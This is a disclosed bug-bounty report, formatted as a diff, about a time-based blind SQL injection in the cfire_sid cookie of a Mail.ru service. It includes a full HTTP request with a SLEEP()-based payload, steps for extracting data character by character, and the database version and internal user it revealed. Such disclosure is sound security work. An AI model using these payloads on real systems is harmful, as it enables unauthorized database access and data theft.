@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/107780
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/konqi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:15.01.2016 10:06:47
+
+Summary:
+SQL injection in out-of-scope service
+Добрый день.
+
+Уязвимо кукис с названием cfire_sid. Рабочий PoC
+
+GET /account/userbar/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25
+Host: cfire.mail.ru
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
+Accept-Encoding: gzip, deflate
+Referer: https://cfire.mail.ru/account/
+Cookie: cfbb_lastvisit=1448331119; cfbb_lastactivity=0; cfire_sid=42767ca19a891c1077f377f6e96120b2'%2%20and%20 if(substring(user(),1,1)='c',SLEEP(3),1)%2b'; cfire_uid=14911677; sdcs=7H5SdDmbxCAVy4Be; pw_sms_pv=708a7; __utma=148931300.1974397146.1448326349.1450489314.1451690206.4; __utmb=148931300.26.10.1451690206; __utmc=148931300; __utmz=148931300.1450146333.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=site%3Acfire.mail.ru; partner_id=1_264_60149_0__; __atuvc=27%7C0; __atuvs=568708d9dcea1dd901a; p=/2IAAOfiTQAA; mrcu=775B5682C0962E7E43C49BD79D25; _ym_uid=1451409559153734271; i=AQAl8oRWAgATAAglDDwAAT4AAT8AAVQAAXIDAf8DAVQEAaQEAV4FAVkGAuwHAUgIAU4CCAQB7QEB; PHPSESSID=*********; iid=139613474; hasflash=false; flashless=false; _ym_isad=0; _ga=GA1.2.1435233556.1451417862; b=oEECAHB0YwQAI/Zko04GYOyEnYpgElUAhAkAAAj9iOZA9C/O1mBmUxYC; searchuid=976077651416940799; t_100451_67_0=1; t_0=1; _es=5a7278bb7415473c9cdc99a2a2a625f1.oJ0woigYlfky5-mVqm7dG2doZCs; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAMDzAcA; mr1lad=568708d960efc1ac-0-0-; Mpop=******; mc2=cfire.mail.ru; _ym_visorc_26627847=w; VID=1X9ciD0SjkXQ0000030614HQ::
+Connection: Keep-Alive
+
+С помощью посимвольного перебора можно экстрактить данные.
+
+ cfire_sid=42767ca19a891c1077f377f6e96120b2'%2%20and%20 if(substring(user(),1,1)='c',SLEEP(3),1)%2b' - true (sleeps 3 sec)
+ cfire_sid=42767ca19a891c1077f377f6e96120b2'%2%20and%20 if(substring(user(),2,1)='x',SLEEP(3),1)%2b'
+
+Полученные данные для демонстрации уязвимости.
+Версия сервера MySQL - 5.5.40
+Имя Пользователя - cfire@172.16.17.54
